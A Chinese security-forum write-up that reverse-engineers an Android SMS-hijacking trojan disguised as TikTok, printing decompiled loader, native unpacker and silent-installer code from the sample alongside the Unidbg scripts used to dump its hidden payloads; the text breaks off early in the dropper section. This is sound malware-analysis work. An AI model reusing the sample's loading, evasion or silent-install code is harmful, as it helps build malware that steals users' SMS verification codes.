---
title: 【看雪】某Android SMS 木马逆向分析
source: https://bbs.kanxue.com/thread-291907.htm
source_host: bbs.kanxue.com
clip_date: 2026-07-07T21:17:23+08:00
trace_id: 308e6f67-abd1-476c-8bfc-fdc64f9eb80a
content_hash: 016a89db2d3d6eb9fa383c724ffeed49183efb51754ae996ac09ec00dc768939
status: summarized
tags:
  - 看雪
series: null
feed_source: 看雪·Android安全
ai_summary: 伪装成TikTok的木马通过多层加载窃取短信验证码，技术复杂度较低但结构完整。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 39675244-d011-81ff-a325-dec2ac403f66
ioc:
  cves: []
  cwes: []
  hashes:
    - 388d7fd938e51455ad9ba27eae9ce01fcbadff8ab88d5a7e9e742cb28402f1e8
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 伪装成TikTok的木马通过多层加载窃取短信验证码，技术复杂度较低但结构完整。
> 
> - **伪装方式：** 恶意软件以TikTok应用为名进行伪装，通过恶意下载器和安装器最终部署核心窃密程序。
> - **加载结构：** 采用分层设计，包含Loader（解密壳）、Installer（修改包名并安装）、最终Payload（窃密核心）三个阶段。
> - **Native解密与加载：** 核心逻辑在Native层完成，通过JNI函数解密assets目录中的加密资源文件，并在内存中动态加载解密后的DEX。
> - **短信劫持：** 最终Payload的核心功能是劫持设备的默认短信应用，并监听、窃取接收到的短信验证码（OTP）。
> - **分析工具：** 分析过程使用Unidbg模拟执行Native函数，以补全JNI环境并成功脱壳解密出恶意载荷。

## 0x0 前言

最近实习主要在做Android的逆向和动态下发分析相关的工作，因此在业余时间找了一个真实的木马样本进行分析，IOC在威胁情报平台上尚无匹配记录，暂无法归属到已知木马家族。经过完整分析后发现，该样本的技术复杂度较简单。本文也被发到我的公众号上：https://mp.weixin.qq.com/s/clCb7TEeSH3ruwLSjqnjxA

| 项目  | 内容  | 说明  |
| --- | --- | --- |
| 样本来源 | MalwareBazaar | [https://bazaar.abuse.ch/sample/388d7fd938e51455ad9ba27eae9ce01fcbadff8ab88d5a7e9e742cb28402f1e8/](https://bbs.kanxue.com/elink@ef1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5i4A6S2j5i4u0Q4x3X3g2S2j5Y4g2K6k6g2\)9J5k6h3y4Z5i4K6u0r3M7$3q4E0M7r3I4W2i4K6u0r3x3K6R3%5E5k6o6N6X3k6o6V1K6z5r3f1#2x3e0b7#2y4h3q4V1z5h3u0S2x3U0N6W2j5h3f1&6j5$3f1H3x3h3k6U0j5X3q4V1k6X3j5^5j5h3t1^5z5r3b7#2j5e0N6W2z5h3f1%4y4o6u0U0j5U0t1^5y4o6l9J5k6U0q4W2z5q4\)9J5c8R3%60.%60.) |
| SHA256 | `388d7fd938e51455ad9ba27eae9ce01fcbadff8ab88d5a7e9e742cb28402f1e8` |     |
| 文件名 |     | 伪装为 TikTok |
| 文件大小 | 7,016,188 Bytes | 约 6.69 MB |
| First Seen | 2026-07-02 12:57:38 UTC | MalwareBazaar |
| Tags | android、apk、banker、dropper、malware、RiskWare、signed、Tiktok | 描述样本行为及伪装目标 |

本文针对一种比较新的（26年7月） Android SMS 劫持恶意软件开展逆向分析，完整还原了其 Loader、安装器及最终 Payload 的执行流程，分析了动态解密、内存加载、JNI 解包、DoH 获取配置、默认短信应用劫持及短信监听等关键技术，最终确定该样本属于以短信验证码（OTP）窃取为核心的 Android SMS Hijacking 恶意软件，具有多层加载、组件动态启用、官方 DoH 隐蔽通信以及 Builder 自动化生成等典型特征。

## 0x1 Loader脱壳

首先看 `AndroidManifest.xml` ，应用定义如下。

```perl
<application
        android:theme="@style/Theme.Downloader"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:name="com.supuyami.xajijupuqi.PewozipuluraApp_ff92"
```

同时 `attachBaseContext` 方法被重写，结合 `Jadx` 反编译结果，推测样本使用了加壳保护。

```java
protected void attachBaseContext(Context context) {
        int iNativeLiteCheck;
        super.attachBaseContext(context);
        Log.i(TAG, "attachBaseContext start");
        try {
            iNativeLiteCheck = nativeLiteCheck(); // 反调Java_com_supuyami_xajijupuqi_PewozipuluraApp_1ff92_nativeLiteCheck from libpmdkzpc.so
        } catch (Throwable th) {
            iNativeLiteCheck = 0;
        }
        try {
            if (iNativeLiteCheck == 3) {
                Log.i(TAG, "silent block: liteResult=3");
                return; // 直接退出
            }
            EnvResult envResultBuildEnvReport = buildEnvReport(context, iNativeLiteCheck);
            // 收集当前设备环境信息，判断设备是否属于"机器人/模拟器/自动化环境"
            if (envResultBuildEnvReport.blocked) {
                Log.i(TAG, "blocked: " + (envResultBuildEnvReport.silent ? "silent" : "sending report"));
                if (!envResultBuildEnvReport.silent) {
                    sendReportAsync(envResultBuildEnvReport.report); // 上报
                }
                launchDecoy(context);
                return;
            }
            byte[] bArrNativeUnpack = nativeUnpack(); // 脱壳代码Java_com_supuyami_xajijupuqi_PewozipuluraApp_1ff92_nativeUnpack from libpmdkzpc.so
            if (bArrNativeUnpack != null && bArrNativeUnpack.length >= 32) { // 解压长度成功？
                Log.i(TAG, "nativeUnpack OK: len=" + bArrNativeUnpack.length);
                ClassLoader classLoader = getClass().getClassLoader();
                InMemoryDexClassLoader inMemoryDexClassLoader = new InMemoryDexClassLoader(ByteBuffer.wrap(bArrNativeUnpack), classLoader);
                copyNativeLibraryDirs(classLoader, inMemoryDexClassLoader);
                replaceClassLoader(context, inMemoryDexClassLoader);
                Log.i(TAG, "classloader replaced: " + inMemoryDexClassLoader.getClass().getSimpleName()); // 替换 DexLoader
                try {
                    context.getResources();
                } catch (Throwable th2) {
                }
                try {
                    getResources(); // 变量缓存刷新
                    return;
                } catch (Throwable th3) {
                    return;
                }
            }
            Log.e(TAG, "nativeUnpack failed: len=" + (bArrNativeUnpack == null ? -1 : bArrNativeUnpack.length)); // 错误处理：脱壳失败
        } catch (Throwable th4) {
            Log.e(TAG, "attachBaseContext error: " + th4);
        } // 错误处理：异常退出
    }
```

其中对应风控模块的 `buildEnvReport` 里面包含大量俄语字符串，可以初步判断该样本可能来自俄语地区的威胁团伙。

在56.al平台尝试自动脱壳，但任务异常失败，报错如下。因此只能采用手动脱壳方式。

![image-20260704082625614](https://bbs.kanxue.com/plugin/chao_editor/rich_text/themes/default/images/spacer.gif)

image-20260704082625614

脱壳对应的函数是 `nativeUnpack` ，位于 `libpmdkzpc.so` ，该函数未使用额外的代码混淆，核心逻辑如下。

```cpp
AAssetManager *__fastcall Java_com_supuyami_xajijupuqi_PewozipuluraApp_1ff92_nativeUnpack(JNIEnv *a1, void *a2){
  AAssetManager *result; // x0
  AAssetManager *v5; // x20
  AAsset *v6; // x21

  v52 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);
  result = (AAssetManager *)((__int64 (__fastcall *)(JNIEnv *))(*a1)->GetObjectClass)(a1);
  if ( result )
  {
    result = (*a1)->GetMethodID(a1, result, "getAssets", "()Landroid/content/res/AssetManager;");
    if ( result )
    {
      result = (AAssetManager *)(*a1)->CallObjectMethod(a1, a2, result);
      if ( result )
      {
        result = AAssetManager_fromJava(a1, result);
        if ( result )
        {
          v5 = result;
          result = AAssetManager_open(result, "hlqudr/tfuvugxs.cache", 3);
          if ( result )
          {
            v6 = result;
            Length = AAsset_getLength(result);
            if ( Length <= 0 || (v8 = Length, (v9 = (int8x16_t *)malloc(Length)) == 0LL) )
            {
              AAsset_close(v6);
              return 0LL;
            }
            v10 = v9;
            v11 = AAsset_read(v6, v9, v8);
            AAsset_close(v6);
            if ( v11 == (_DWORD)v8 )
            {
              v12 = AAssetManager_open(v5, "hlqudr/cphxetqa.tmp", 3);
              if ( v12 )
              {
                v13 = v12;
                v14 = AAsset_getLength(v12);
                v15 = v14;
                if ( v14 < 1 )
                {
                  v17 = 0LL;
LABEL_23:
                  AAsset_close(v13);
                  free(v10);
                  if ( v15 >= 1 )
                  {
                    v28 = v17;
LABEL_27:
                    free(v28);
                  }
                  return 0LL;
                }
                v16 = (int8x16_t *)malloc(v14);
                if ( v16 )
                {
                  v17 = v16;
                  v18 = AAsset_read(v13, v16, v15);
                  AAsset_close(v13);
                  if ( v18 != (_DWORD)v15 )
                  {
                    v23 = 0LL;
                    goto LABEL_31;
                  }
                  v19 = AAssetManager_open(v5, "hlqudr/yccfliek.bin", 3);
                  if ( !v19 )
                  {
LABEL_34:
                    free(v10);
                    v28 = v17;
                    goto LABEL_27;
                  }
                  v13 = v19;
                  v20 = AAsset_getLength(v19);
                  if ( v20 >= 1 )
                  {
                    v21 = v20;
                    v22 = (int8x16_t *)malloc(v20);
                    if ( v22 )
                    {
                      v23 = v22;
                      v43 = AAsset_read(v13, v22, v21);
                      AAsset_close(v13);
                      if ( v43 == (_DWORD)v21 )
                      {
                        v24 = v21 + v15 + v8;
                        v25 = (int8x16_t *)malloc(v24);
                        if ( !v25 )
                        {
                          free(v10);
                          free(v17);
                          v28 = v23;
                          goto LABEL_27;
...
```

该 JNI 函数首先通过 `AssetManager` 从 APK 的 `assets` 目录依次读取三个资源文件（ `hlqudr/tfuvugxs.cache` 、 `hlqudr/cphxetqa.tmp` 、 `hlqudr/yccfliek.bin` ），将其内容按顺序拼接到一块连续缓冲区中。随后使用一个 32 字节循环密钥对拼接后的数据执行 XOR 解密，完成解密后，函数调用 zlib 的 `inflate` 接口对数据进行解压。在输出缓冲区不足时会自动扩容并重新解压，最终将还原得到的原始 Dex 数据封装为 Java 层的 `byte[]` 返回。

接下来编写 Unidbg 脚本模拟执行：

```java
public static void main(String[] args) throws IOException {
 final DemoUnidbg demo = new DemoUnidbg();
 demo.traceCode(); // hook assembly
 demo.callnativeUnpack();
}
public DemoUnidbg() throws IOException {
 emulator = AndroidEmulatorBuilder
  .for64Bit()
  .setProcessName("com.zhiliaoapp.musically")
  .addBackendFactory(new Unicorn2Factory(true))
  .build();
 Memory memory = emulator.getMemory();
 memory.setLibraryResolver(new AndroidResolver(23));
 vm = emulator.createDalvikVM(new File("/home/ldz/unidbg-0.9.8/target/tiktok.apk"));
 vm.setVerbose(true);
 vm.setJni(this);
 new FixedAndroidModule(emulator, vm).register(memory);
 dm = vm.loadLibrary(new File("/home/ldz/unidbg-0.9.8/target/arm64-v8a/libpmdkzpc.so"), true);
 module = dm.getModule();
}
```

报错如下：

```php
[+] 开始步入 Native 函数...
JNIEnv->GetMethodID(com/supuyami/xajijupuqi/PewozipuluraApp_ff92.getAssets()Landroid/content/res/AssetManager;) => 0x7ea19d1d was called from RX@0x40001ed8[libpmdkzpc.so]0x1ed8
[09:07:05 485]  WARN [com.github.unidbg.linux.ARM64SyscallHandler] (ARM64SyscallHandler:412) - handleInterrupt intno=2, NR=-130448, svcNumber=0x11e, PC=unidbg@0xfffe0274, LR=RX@0x40001ef4[libpmdkzpc.so]0x1ef4, syscall=null
java.lang.UnsupportedOperationException: com/supuyami/xajijupuqi/PewozipuluraApp_ff92->getAssets()Landroid/content/res/AssetManager;
 at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:933)
 at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:867)
 at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethod(DvmMethod.java:69)
 at com.github.unidbg.linux.android.dvm.DalvikVM64$31.handle(DalvikVM64.java:533)
 at com.github.unidbg.linux.ARM64SyscallHandler.hook(ARM64SyscallHandler.java:121)
 at com.github.unidbg.arm.backend.Unicorn2Backend$11.hook(Unicorn2Backend.java:352)
 at com.github.unidbg.arm.backend.unicorn.Unicorn$NewHook.onInterrupt(Unicorn.java:109)
 at com.github.unidbg.arm.backend.unicorn.Unicorn.emu_start(Native Method)
```

补全 JNI 方法实现：

```typescript
@Override
public DvmObject<?> callObjectMethodV(BaseVM vm, DvmObject<?> dvmObject, String signature, VaList vaList) {
 // 拦截 getAssets()Landroid/content/res/AssetManager; 的调用
 if ("java/lang/Class->getAssets()Landroid/content/res/AssetManager;".equals(signature) ||
"com/supuyami/xajijupuqi/PewozipuluraApp_ff92-  >getAssets()Landroid/content/res/AssetManager;".equals(signature)) {
  return vm.resolveClass("android/content/res/AssetManager").newObject(null);
 }

 return super.callObjectMethodV(vm, dvmObject, signature, vaList);
}

@Override
public DvmObject<?> callObjectMethod(BaseVM vm, DvmObject<?> dvmObject, String signature, VarArg varArg) {
 if ("java/lang/Class->getAssets()Landroid/content/res/AssetManager;".equals(signature) ||
"com/supuyami/xajijupuqi/PewozipuluraApp_ff92->getAssets()Landroid/content/res/AssetManager;".equals(signature)) {
  return vm.resolveClass("android/content/res/AssetManager").newObject(null);
 }
 return super.callObjectMethod(vm, dvmObject, signature, varArg);
}
```

报错如下：

```sql
INFO [com.github.unidbg.linux.AndroidElfLoader] (AndroidElfLoader:481) - libpmdkzpc.so load dependency libandroid.so failed
...
0x4000239C (+0x239C): br       x17
[09:18:22 966]  WARN [com.github.unidbg.arm.AbstractARM64Emulator] (AbstractARM64Emulator$1:66) - Fetch memory failed: address=0x2340, size=4, value=0x0
[09:18:22 967]  WARN [com.github.unidbg.AbstractEmulator] (AbstractEmulator:417) - emulate RX@0x40001e70[libpmdkzpc.so]0x1e70 exception sp=unidbg@0xbffff620, msg=unicorn.UnicornException: Invalid memory fetch (UC_ERR_FETCH_UNMAPPED), offset=16ms @ Runnable|Function64 address=0x40001e70, arguments=[unidbg@0xfffe1640, 433874882]
[+] 调用完成。返回值为: -1
```

缺少 `libandroid.so` 及对应的 `AAssetManager_fromJava` 等函数，需要使用 `VirtualModule` 补全运行环境。

```java
static class FixedAndroidModule extends VirtualModule<VM> {
        FixedAndroidModule(Emulator<?> emulator, VM vm) {
            super(emulator, vm, "libandroid.so");
        }
        @Override
        protected void onInitialize(Emulator<?> emulator, VM vm, Map<String, UnidbgPointer> symbols) {
            SvcMemory svcMemory = emulator.getSvcMemory();
            symbols.put("AAssetManager_fromJava", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    UnidbgPointer assetManager = context.getPointerArg(1);
                    vm.getObject(assetManager.toIntPeer());
                    return assetManager.peer;
                }}));
            symbols.put("AAssetManager_open", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    String filename = context.getPointerArg(1).getString(0);
                    System.out.println("AAssetManager_open: " + filename);
                    try {
                        Path path = Paths.get(
                                "/home/ldz/unidbg-0.9.8/target/tiktok/assets",
                                filename
                        );
                        if (!Files.exists(path)) {
                            System.out.println("asset not found: " + path);
                            return 0;
                        }
                        byte[] data = Files.readAllBytes(path);
                        Asset asset = new Asset(vm, filename);
                        asset.open(emulator, data);
                        return vm.addLocalObject(asset);
                    } catch (IOException e) {
                        e.printStackTrace();
                        return 0;
                    }
                }}));
            symbols.put("AAsset_getLength", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    UnidbgPointer pointer = context.getPointerArg(0);
                    Asset asset = vm.getObject(pointer.toIntPeer());
                    return asset.getLength();
                }}));
            symbols.put("AAsset_close", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    UnidbgPointer pointer = context.getPointerArg(0);
                    Asset asset = vm.getObject(pointer.toIntPeer());
                    asset.close();
                    return 0;
                }}));
            symbols.put("AAsset_getBuffer", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    UnidbgPointer pointer = context.getPointerArg(0);
                    Asset asset = vm.getObject(pointer.toIntPeer());
                    return asset.getBuffer().peer;
                }}));
            symbols.put("AAsset_read", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    UnidbgPointer pointer = context.getPointerArg(0);
                    Pointer buf = context.getPointerArg(1);
                    int count = context.getIntArg(2);
                    Asset asset = vm.getObject(pointer.toIntPeer());
                    byte[] bytes = asset.read(count);
                    buf.write(0, bytes, 0, bytes.length);
                    return bytes.length;
                }}));
        }
    }
```

运行后成功将内容 dump 为 Dex 文件，使用 Jadx 打开，可以正常反编译。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6d8543952b5ec177.webp)

分析发现，该 Dex 文件主要实现了 VPN 功能和动态安装 APK 的逻辑。

![image-20260704105547257](https://bbs.kanxue.com/plugin/chao_editor/rich_text/themes/default/images/spacer.gif)

image-20260704105547257

## 0x2 Installer脱壳

我们可以在 `com.supuyami.xajijupuqi` 包的 `SuseqarolimoActivity_b320` 类（启动 Activity）中看到 `onCreate` 方法的核心逻辑：

```java
public void onCreate(Bundle bundle) {
        if (AppCompatDelegate.leqoje != 1) {
            AppCompatDelegate.leqoje = 1;
            synchronized (AppCompatDelegate.xedirefu) {
                try {
                    rigi.Lemitege<WeakReference<AppCompatDelegate>> lemitege = AppCompatDelegate.jijiwudase;
                    lemitege.getClass();
                    Lemitege.Cekuwigupega cekuwigupega = new Lemitege.Cekuwigupega();
                    while (cekuwigupega.hasNext()) {
                        AppCompatDelegate appCompatDelegate = (AppCompatDelegate) ((WeakReference) cekuwigupega.next()).get();
                        if (appCompatDelegate != null) {
                            appCompatDelegate.zavahu();
                        }
                    }
                } finally {
                }
            }
        } // 强制关闭深色模式
        super.onCreate(bundle);
        ActivityMainBinding activityMainBindingInflate = ActivityMainBinding.inflate(getLayoutInflater());
        this.binding = activityMainBindingInflate;
        if (activityMainBindingInflate == null) {
            Intrinsics.hesezewi("binding");
            throw null;
        } // 刷新所有Activity主题
        setContentView(activityMainBindingInflate.gimi);
        WindowCompat.gimi(getWindow());
        getWindow().setStatusBarColor(0);
        getWindow().setNavigationBarColor(0);
        boolean z = (getResources().getConfiguration().uiMode & 48) == 32;
        Window window = getWindow();
        getWindow().getDecorView();
        WindowInsetsControllerCompat windowInsetsControllerCompat = new WindowInsetsControllerCompat(window);
        boolean z2 = !z;
        windowInsetsControllerCompat.qebuhu(z2);
        windowInsetsControllerCompat.gimi(z2);
        setupWebView(); // 设置为tiktok启动页面，让用户觉得正在启动tiktok
        ContextCompat.gimi(this, this.installStartedReceiver, new IntentFilter(KazulijepaService_148a.ACTION_INSTALL_STARTED)); // 监听安装开始
        ContextCompat.gimi(this, this.permissionGrantedReceiver, new IntentFilter(WunamuvuxariduqeMonitor_8e3f.ACTION_UNKNOWN_SOURCES_GRANTED)); // 安装权限是否通过
        ContextCompat.gimi(this, this.installFinishedReceiver, new IntentFilter(DowuharoquReceiver_7c3e.ACTION_CRISTOFER_INSTALLED)); // 是否安装成功
        ContextCompat.gimi(this, this.vpnReadyReceiver, new IntentFilter("a.dfdywgpq.fpyc"));
        if (checkIfPayloadInstalled()) { // payload是否安装
            return; // 安装则返回
        } 
        preparePayload(); // 安装payload
    }

 private final void preparePayload() {
        BuildersKt.gimi(CoroutineScopeKt.gimi(Dispatchers.qebuhu), new Najohigeca(null));
    } // 利用 Kotlin 的协程（Coroutines）异步开启了一个后台任务，在后台静默下载或解密并强行安装 Payload。
```

下载 `Payload` 的逻辑位于 `Najohigeca` 类的 `invokeSuspend` 方法下，混淆后对应的名称是 `hesezewi` ，主要逻辑位于 `case 0` 分支。动态加载流程如下：

```
onCreate()
↓
checkIfPayloadInstalled() ← 检查TikTok是否已安装
↓ (未安装)
preparePayload()
↓
m_ziutteqo(assets, "jurmyjdt.bin", cachePath) ← Native解密
↓
m_lscjkcya(originalPkg) ← 生成新包名
↓
patchPackageName(oldApk, newApk, oldPkg, newPkg) ← 修改包名
↓
m_clpdouaj(apkPath) ← 最终处理
↓
signApkInPlace(apkPath) ← 重签名
↓
runInstallService() ← 启动安装
```

其中， `m_ziutteqo` 方法在 `libqbflddv.so` 中通过 JNI 动态注册，我们可以使用 Unidbg 模拟执行该方法。

```swift
JNIEnv->FindClass(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320) was called from RX@0x4004eda8[libqbflddv.so]0x4eda8
JNIEnv->RegisterNatives(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, unidbg@0xbffff630, 5) was called from RX@0x4004f084[libqbflddv.so]0x4f084
RegisterNative(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, m_ziutteqo(Landroid/content/res/AssetManager;Ljava/lang/String;Ljava/lang/String;)Z, RX@0x4004ca88[libqbflddv.so]0x4ca88)
RegisterNative(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, m_nuiwgchk(Ljava/lang/String;)Z, RX@0x4004d7b4[libqbflddv.so]0x4d7b4)
RegisterNative(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, m_clpdouaj(Ljava/lang/String;)Z, RX@0x4004e000[libqbflddv.so]0x4e000)
RegisterNative(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, m_lscjkcya(Ljava/lang/String;)Ljava/lang/String;, RX@0x4004e06c[libqbflddv.so]0x4e06c)
RegisterNative(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, m_gldbmkvh(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z, RX@0x4004e3d4[libqbflddv.so]0x4e3d4)
JNIEnv->FindClass(com/supuyami/xajijupuqi/QevobufiyoruChecker_fa40) was called from RX@0x4004f0c0[libqbflddv.so]0x4f0c0
JNIEnv->RegisterNatives(com/supuyami/xajijupuqi/QevobufiyoruChecker_fa40, unidbg@0xbffff630, 3) was called from RX@0x4004f28c[libqbflddv.so]0x4f28c
RegisterNative(com/supuyami/xajijupuqi/QevobufiyoruChecker_fa40, m_brafwpmv()Z, RX@0x4004f418[libqbflddv.so]0x4f418)
RegisterNative(com/supuyami/xajijupuqi/QevobufiyoruChecker_fa40, m_whcmcvzy()Z, RX@0x4004f590[libqbflddv.so]0x4f590)
RegisterNative(com/supuyami/xajijupuqi/QevobufiyoruChecker_fa40, m_fdwgntut()Z, RX@0x4004fde0[libqbflddv.so]0x4fde0)
```

其中 `m_ziutteqo` 对应的偏移地址是 `0x4ca88` ，可以直接模拟执行获取目标 APK 文件。执行过程无报错，代码如下：

```java
private void callUnpackApk() throws IOException {
        // Function address for sub_4CA88
        long FuncAddr = 0x4CA88;

        // Prepare the output file path - use a simple path that unidbg can write to
        String outputPath = "/data/local/tmp/unpacked.apk";
        String realOutputPath = "/home/ldz/unidbg-0.9.8/unpacked.apk";

        System.out.println("[+] Starting APK unpack...");
        System.out.println("[+] Asset file: jurmyjdt.bin");
        System.out.println("[+] Output path (virtual): " + outputPath);
        System.out.println("[+] Output path (real): " + realOutputPath);

        // Get AssetManager
        DvmObject<?> assetManager = vm.resolveClass("android/content/res/AssetManager").newObject(null);

        // Prepare parameters for direct function call
        Pointer jniEnv = vm.getJNIEnv();
        int assetManagerHandle = vm.addLocalObject(assetManager);

        // Create Java string objects
        StringObject assetFileName = new StringObject(vm, "jurmyjdt.bin");
        StringObject outputPathStr = new StringObject(vm, outputPath);
        int assetFileHandle = vm.addLocalObject(assetFileName);
        int outputPathHandle = vm.addLocalObject(outputPathStr);

        // Call the native function directly
        System.out.println("[+] Calling native function sub_4CA88...");
        List<Object> args = new ArrayList<>();
        args.add(jniEnv);              // X0: JNIEnv*
        args.add(0);                   // X1: jclass (can be 0 for non-static)
        args.add(assetManagerHandle);  // X2: AssetManager jobject
        args.add(assetFileHandle);     // X3: filename jstring
        args.add(outputPathHandle);    // X4: output path jstring

        Number result = module.callFunction(emulator, FuncAddr, args.toArray());

        System.out.println("[+] Native call completed. Return value: " + result.intValue());

        // Try to read the file from unidbg's virtual filesystem
        if (result.intValue() == 1) {
            try {
                com.github.unidbg.file.FileResult fileResult =
                    emulator.getFileSystem().open(outputPath, com.github.unidbg.file.linux.IOConstants.O_RDONLY);

                if (fileResult != null && fileResult.isSuccess()) {
                    com.github.unidbg.file.linux.AndroidFileIO fileIO =
                        (com.github.unidbg.file.linux.AndroidFileIO) fileResult.io;

                    // Seek to end to get file size
                    long fileSize = fileIO.lseek(0, 2);  // SEEK_END = 2
                    fileIO.lseek(0, 0);  // SEEK_SET = 0

                    // Allocate memory and read
                    Memory memory = emulator.getMemory();
                    UnidbgPointer buffer = memory.malloc((int)fileSize, false).getPointer();
                    int bytesRead = fileIO.read(emulator.getBackend(), buffer, (int)fileSize);

                    // Copy to byte array
                    byte[] data = buffer.getByteArray(0, bytesRead);
                    fileIO.close();

                    // Write to real filesystem
                    Files.write(Paths.get(realOutputPath), data);

                    System.out.println("[+] Success! APK unpacked and saved to: " + realOutputPath);
                    System.out.println("[+] File size: " + bytesRead + " bytes");
                } else {
                    System.out.println("[-] Could not open file from virtual filesystem");
                }
            } catch (Exception e) {
                System.out.println("[-] Error reading from virtual filesystem: " + e.getMessage());
                e.printStackTrace();
            }
        } else {
            System.out.println("[-] Native function returned failure");
        }
    }
```

## 0x3 Dropper分析

其整体执行流程如图所示。

```
Application.attachBaseContext()
        │
        ▼
环境检测
(Bot检测、安装环境检测)
        │
        ▼
JNI解密(libldcaeux.so::fllzsswi)
        │
        ▼
InMemoryDexClassLoader
动态加载Dex
        │
        ▼
替换Application/ClassLoader
        │
        ▼
启动真实Payload
```

该 APK 的入口类为 `GexojofiApp51ef` ，其重写了 `Application.attachBaseContext()` 方法，并在应用生命周期最早阶段执行全部初始化逻辑。与第一层 Loader 相同，该样本再次采用 Native 代码完成解密，其中核心函数 `fllzsswi()` 位于 `libldcaeux.so` 中，其返回值为解密后的 DEX 字节流。当检测失败时，程序不会继续执行恶意逻辑，而是启动 `QibabumupayipeAuth76ed` Activity，仅显示一个
